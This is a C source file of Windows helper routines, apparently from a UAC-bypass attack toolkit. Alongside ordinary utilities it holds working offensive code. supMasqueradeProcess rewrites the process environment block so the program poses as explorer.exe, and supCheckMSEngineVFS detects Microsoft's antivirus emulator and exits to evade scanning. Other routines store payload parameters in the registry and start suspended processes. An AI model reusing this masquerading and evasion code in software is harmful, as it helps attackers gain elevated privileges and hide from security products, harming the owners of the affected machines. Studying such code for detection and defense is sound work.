/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2017
*
*  TITLE:       SUP.C
*
*  VERSION:     2.53
*
*  DATE:        18 Jan 2017
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* supIsProcess32bit
*
* Purpose:
*
* Return TRUE if given process is under WOW64, FALSE otherwise.
*
*/
BOOLEAN supIsProcess32bit(
    _In_ HANDLE hProcess
    )
{
    NTSTATUS status;
    PROCESS_EXTENDED_BASIC_INFORMATION pebi;

    if (hProcess == NULL) {
        return FALSE;
    }

    //query if this is wow64 process
    RtlSecureZeroMemory(&pebi, sizeof(pebi));
    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pebi, sizeof(pebi), NULL);
    if (NT_SUCCESS(status)) {
        return (pebi.IsWow64Process == 1);
    }
    return FALSE;
}

/*
* supGetElevationType
*
* Purpose:
*
* Returns client elevation type.
*
*/
BOOL supGetElevationType(
    TOKEN_ELEVATION_TYPE *lpType
    )
{
    HANDLE hToken = NULL;
    NTSTATUS status;
    ULONG bytesRead = 0;

    if (lpType == NULL) {
        return FALSE;
    }

    status = NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    if (!NT_SUCCESS(status)) {
        SetLastError(RtlNtStatusToDosError(status));
        return FALSE;
    }

    status = NtQueryInformationToken(hToken, TokenElevationType, lpType,
        sizeof(TOKEN_ELEVATION_TYPE), &bytesRead);

    SetLastError(RtlNtStatusToDosError(status));

    NtClose(hToken);

    return (NT_SUCCESS(status));
}

/*
* supWriteBufferToFile
*
* Purpose:
*
* Create new file and write buffer to it.
*
*/
BOOL supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize
    )
{
    HANDLE hFile;
    DWORD bytesIO;

    if (
        (lpFileName == NULL) ||
        (Buffer == NULL) ||
        (BufferSize == 0)
        )
    {
        return FALSE;
    }

    hFile = CreateFileW(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
    CloseHandle(hFile);

    return (bytesIO == BufferSize);
}

/*
* supRunProcess
*
* Purpose:
*
* Execute given process with given parameters.
*
*/
BOOL supRunProcess(
    _In_ LPWSTR lpszProcessName,
    _In_opt_ LPWSTR lpszParameters
    )
{
    BOOL bResult;
    SHELLEXECUTEINFOW shinfo;
    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

    if (lpszProcessName == NULL) {
        return FALSE;
    }

    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shinfo.lpFile = lpszProcessName;
    shinfo.lpParameters = lpszParameters;
    shinfo.lpDirectory = NULL;
    shinfo.nShow = SW_SHOW;
    bResult = ShellExecuteExW(&shinfo);
    if (bResult) {
        WaitForSingleObject(shinfo.hProcess, 0x8000);
        CloseHandle(shinfo.hProcess);
    }
    return bResult;
}

/*
* supRunProcessEx
*
* Purpose:
*
* Start new process in suspended state.
*
*/
HANDLE NTAPI supRunProcessEx(
    _In_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpCurrentDirectory,
    _Out_opt_ HANDLE *PrimaryThread,
    _Inout_opt_ LPWSTR lpApplicationName
    )
{
    BOOL cond = FALSE;
    LPWSTR pszBuffer = NULL;
    SIZE_T ccb;
    STARTUPINFOW sti1;
    PROCESS_INFORMATION pi1;
    DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;
    
    if (PrimaryThread) {
        *PrimaryThread = NULL;
    }

    if (lpszParameters == NULL) {
        return NULL;
    }
    
    ccb = (_strlen_w(lpszParameters) * sizeof(WCHAR)) + sizeof(WCHAR);
    pszBuffer = HeapAlloc(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, ccb);
    if (pszBuffer == NULL) {
        return NULL;
    }

    _strcpy_w(pszBuffer, lpszParameters);

    RtlSecureZeroMemory(&pi1, sizeof(pi1));
    RtlSecureZeroMemory(&sti1, sizeof(sti1));
    GetStartupInfoW(&sti1);
    
    do {

        if (!CreateProcessAsUser(NULL, lpApplicationName, pszBuffer, NULL, NULL, FALSE, dwFlags | CREATE_SUSPENDED,
            NULL, lpCurrentDirectory, &sti1, &pi1))
        {
            break;
        }

        if (PrimaryThread) {
            *PrimaryThread = pi1.hThread;
        }
        else {
            CloseHandle(pi1.hThread);
        }
    } while (cond);

    HeapFree(g_ctx.Peb->ProcessHeap, 0, pszBuffer);
    
    return pi1.hProcess;
}

/*
* supCopyMemory
*
* Purpose:
*
* Copies bytes between buffers.
*
* dest - Destination buffer
* cbdest - Destination buffer size in bytes
* src - Source buffer
* cbsrc - Source buffer size in bytes
*
*/
void supCopyMemory(
    _Inout_ void *dest,
    _In_ size_t cbdest,
    _In_ const void *src,
    _In_ size_t cbsrc
    )
{
    char *d = (char*)dest;
    char *s = (char*)src;

    if ((dest == 0) || (src == 0) || (cbdest == 0))
        return;
    if (cbdest < cbsrc)
        cbsrc = cbdest;

    while (cbsrc > 0) {
        *d++ = *s++;
        cbsrc--;
    }
}

/*
* supQueryEntryPointRVA
*
* Purpose:
*
* Return EP RVA of the given PE file.
*
*/
DWORD supQueryEntryPointRVA(
    _In_ LPWSTR lpImageFile
    )
{
    PVOID                       ImageBase;
    PIMAGE_DOS_HEADER           pdosh;
    PIMAGE_FILE_HEADER          pfh1;
    PIMAGE_OPTIONAL_HEADER      poh;
    DWORD                       epRVA = 0;

    if (lpImageFile == NULL) {
        return 0;
    }

    ImageBase = LoadLibraryExW(lpImageFile, 0, DONT_RESOLVE_DLL_REFERENCES);
    if (ImageBase) {

        pdosh = (PIMAGE_DOS_HEADER)ImageBase;
        pfh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + (pdosh->e_lfanew + sizeof(DWORD)));
        poh = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)pfh1 + sizeof(IMAGE_FILE_HEADER));

        //AddressOfEntryPoint is in standard fields.
        epRVA = poh->AddressOfEntryPoint;

        FreeLibrary(ImageBase);
    }
    return epRVA;
}

/*
* supSetParameter
*
* Purpose:
*
* Set parameter for payload execution.
*
*/
BOOL supSetParameter(
    LPWSTR lpParameter,
    DWORD cbParameter
    )
{
    BOOL cond = FALSE, bResult = FALSE;
    HKEY hKey;
    LRESULT lRet;

    hKey = NULL;

    do {
        lRet = RegCreateKeyExW(HKEY_CURRENT_USER, T_AKAGI_KEY, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

        if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
            break;
        }

        RegSetValueExW(hKey, T_AKAGI_FLAG, 0, REG_DWORD, (BYTE *)&g_ctx.Flag, sizeof(DWORD));

        lRet = RegSetValueExW(hKey, T_AKAGI_PARAM, 0, REG_SZ,
            (LPBYTE)lpParameter, cbParameter);

        bResult = (lRet == ERROR_SUCCESS);

    } while (cond);

    if (hKey) {
        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* supChkSum
*
* Purpose:
*
* Calculate partial checksum for given buffer.
*
*/
USHORT supChkSum(
    ULONG PartialSum,
    PUSHORT Source,
    ULONG Length
    )
{
    while (Length--) {
        PartialSum += *Source++;
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
    }
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}

/*
* supVerifyMappedImageMatchesChecksum
*
* Purpose:
*
* Calculate PE file checksum and compare it with checksum in PE header.
*
*/
BOOLEAN supVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
    )
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    USHORT PartialSum;
    ULONG HeaderSum;
    ULONG CheckSum;

    HeaderSum = 0;
    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders != NULL) {
        HeaderSum = NtHeaders->OptionalHeader.CheckSum;
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
    }
    else
    {
        PartialSum = 0;
        HeaderSum = FileLength;
    }
    CheckSum = (ULONG)PartialSum + FileLength;
    return (CheckSum == HeaderSum);
}

/*
* ucmShowMessage
*
* Purpose:
*
* Output message to user.
*
*/
VOID ucmShowMessage(
    LPWSTR lpszMsg
    )
{
    if (lpszMsg) {
        MessageBoxW(GetDesktopWindow(),
            lpszMsg, PROGRAMTITLE, MB_ICONINFORMATION);
    }
}

/*
* ucmShowQuestion
*
* Purpose:
*
* Output message with question to user.
*
*/
INT ucmShowQuestion(
    LPWSTR lpszMsg
    )
{
    return MessageBoxW(GetDesktopWindow(), lpszMsg, PROGRAMTITLE, MB_YESNO);
}

/*
* supLdrQueryResourceData
*
* Purpose:
*
* Load resource by given id (win32 FindResource, SizeofResource, LockResource).
*
*/
PBYTE supLdrQueryResourceData(
    _In_ ULONG_PTR ResourceId,
    _In_ PVOID DllHandle,
    _In_ PULONG DataSize
    )
{
    NTSTATUS                   status;
    ULONG_PTR                  IdPath[3];
    IMAGE_RESOURCE_DATA_ENTRY  *DataEntry;
    PBYTE                      Data = NULL;
    ULONG                      SizeOfData = 0;

    if (DllHandle != NULL) {

        IdPath[0] = (ULONG_PTR)RT_RCDATA; //type
        IdPath[1] = ResourceId;           //id
        IdPath[2] = 0;                    //lang

        status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);
        if (NT_SUCCESS(status)) {
            status = LdrAccessResource(DllHandle, DataEntry, &Data, &SizeOfData);
            if (NT_SUCCESS(status)) {
                if (DataSize) {
                    *DataSize = SizeOfData;
                }
            }
        }
    }
    return Data;
}

static LPWSTR g_lpszExplorer = NULL;

/*
* supxLdrEnumModulesCallback
*
* Purpose:
*
* LdrEnumerateLoadedModules callback.
*
*/
VOID NTAPI supxLdrEnumModulesCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _In_ OUT BOOLEAN *StopEnumeration
    )
{
    PPEB Peb = (PPEB)Context;

    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, g_lpszExplorer);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, EXPLORER_EXE);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

/*
* supMasqueradeProcess
*
* Purpose:
*
* Fake current process information.
* As in fact Windows only cares about loader entry information as they use PSAPI like bullshit.
*
*/
VOID supMasqueradeProcess(
    VOID
    )
{
    SIZE_T  sz = 0x1000;
    PPEB    Peb = g_ctx.Peb;
    DWORD   cch;
    WCHAR   szBuffer[MAX_PATH + 1];

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    cch = GetWindowsDirectory(szBuffer, MAX_PATH);
    if ((cch != 0) && (cch < MAX_PATH)) {

        _strcat(szBuffer, L"\\explorer.exe");

        g_lpszExplorer = NULL;
        NtAllocateVirtualMemory(NtCurrentProcess(), &g_lpszExplorer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (g_lpszExplorer) {
            _strcpy(g_lpszExplorer, szBuffer);

            RtlEnterCriticalSection(Peb->FastPebLock);

            RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszExplorer);
            RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, APPCMDLINE);

            RtlLeaveCriticalSection(Peb->FastPebLock);

            LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
        }
    }
}

/*
* supExpandEnvironmentStrings
*
* Purpose:
*
* Native ExpandEnvironmetStrings.
*
*/
DWORD supExpandEnvironmentStrings(
    LPCWSTR lpSrc,
    LPWSTR lpDst,
    DWORD nSize
    )
{
    NTSTATUS Status;
    UNICODE_STRING Source, Destination;
    ULONG Length;
    DWORD iSize;

    if (nSize > (MAXUSHORT >> 1) - 2) {
        iSize = (MAXUSHORT >> 1) - 2;
    }
    else {
        iSize = nSize;
    }

    RtlSecureZeroMemory(&Source, sizeof(Source));
    RtlInitUnicodeString(&Source, lpSrc);
    Destination.Buffer = lpDst;
    Destination.Length = 0;
    Destination.MaximumLength = (USHORT)(iSize * sizeof(WCHAR));
    Length = 0;
    Status = RtlExpandEnvironmentStrings_U(NULL,
        &Source,
        &Destination,
        &Length
        );
    if (NT_SUCCESS(Status) || Status == STATUS_BUFFER_TOO_SMALL) {
        return(Length / sizeof(WCHAR));
    }
    else {
        RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
        return 0;
    }
}

/*
* supScanFiles
*
* Purpose:
*
* Find files of the given type and run callback over them.
*
*/
BOOL supScanFiles(
    _In_ LPWSTR lpDirectory,
    _In_ LPWSTR lpFileType,
    _In_ UCM_FIND_FILE_CALLBACK Callback
    )
{
    BOOL bStopEnumeration = FALSE;
    HANDLE hFile;
    WCHAR textbuf[MAX_PATH * 2];
    WIN32_FIND_DATA fdata;

    if ((Callback == NULL) || (lpDirectory == NULL) || (lpFileType == NULL))
        return FALSE;

    RtlSecureZeroMemory(textbuf, sizeof(textbuf));

    _strncpy(textbuf, MAX_PATH, lpDirectory, MAX_PATH);
    _strcat(textbuf, L"\\");
    _strncpy(_strend(textbuf), 20, lpFileType, 20);

    RtlSecureZeroMemory(&fdata, sizeof(fdata));
    hFile = FindFirstFile(textbuf, &fdata);
    if (hFile != INVALID_HANDLE_VALUE) {
        do {

            bStopEnumeration = Callback(&fdata, lpDirectory);
            if (bStopEnumeration)
                break;

        } while (FindNextFile(hFile, &fdata));
        FindClose(hFile);
    }
    return bStopEnumeration;
}

/*
* supCheckMSEngineVFS
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it own VFS artefact.
*
* Microsoft AV provides special emulated environment for scanned application where it
* fakes general system information, process environment structures/data to make sure 
* API calls are transparent for scanned code. It also use simple Virtual File System 
* allowing this AV track file system changes and if needed continue emulation on new target.
*
* This method implemented in commercial malware presumable since 2013.
*
*/
VOID supCheckMSEngineVFS(
    VOID
    )
{
    WCHAR szBuffer[MAX_PATH];
    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetModuleFileName(NULL, szBuffer, MAX_PATH);
    if (_strstri(szBuffer, szMsEngVFS) != NULL) {
        ExitProcess((UINT)0);
    }
}

/*
* sxsFilePathNoSlash
*
* Purpose:
*
* same as _filepath except it doesnt return last slash.
*
*/
wchar_t *sxsFilePathNoSlash(
    const wchar_t *fname, 
    wchar_t *fpath
    )
{
    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;

    if ((fname == 0) || (fpath == NULL))
        return 0;

    while (*fname != (wchar_t)0) {
        if (*fname == '\\')
            p = (wchar_t *)fname;
        fname++;
    }

    while (p0 < p) {
        *p1 = *p0;
        p1++;
        p0++;
    }
    *p1 = 0;

    return fpath;
}

/*
* sxsFindDllCallback
*
* Purpose:
*
* LdrEnumerateLoadedModules callback used to lookup sxs dlls from loader list.
*
*/
VOID NTAPI sxsFindDllCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _In_ OUT BOOLEAN *StopEnumeration
    )
{
    BOOL bCond = FALSE;
    BOOLEAN bFound = FALSE;
    PSXS_SEARCH_CONTEXT sctx = (PSXS_SEARCH_CONTEXT)Context;

    do {

        if ((DataTableEntry->BaseDllName.Buffer == NULL) ||
            (DataTableEntry->FullDllName.Buffer == NULL))
            break;

        if (_strcmpi(DataTableEntry->BaseDllName.Buffer, sctx->DllName) != 0)
            break;

        if (_strstri(DataTableEntry->FullDllName.Buffer, sctx->PartialPath) == NULL)
            break;

        if (sxsFilePathNoSlash(DataTableEntry->FullDllName.Buffer, sctx->FullDllPath) == NULL)
            break;

        bFound = TRUE;

    } while (bCond);

    *StopEnumeration = bFound;
}

/*
* supNativeGetProcAddress
*
* Purpose:
*
* Simplified native GetProcAddress.
*
*/
PVOID supNativeGetProcAddress(
    WCHAR *Module,
    CHAR *Routine
)
{
    PVOID            DllImageBase = NULL, ProcedureAddress = NULL;
    UNICODE_STRING   DllName;
    ANSI_STRING      str;

    RtlSecureZeroMemory(&DllName, sizeof(DllName));
    RtlInitUnicodeString(&DllName, Module);
    if (!NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &DllName, &DllImageBase)))
        return NULL;

    RtlInitString(&str, Routine);
    if (!NT_SUCCESS(LdrGetProcedureAddress(DllImageBase, &str, 0, &ProcedureAddress)))
        return NULL;

    return ProcedureAddress;
}
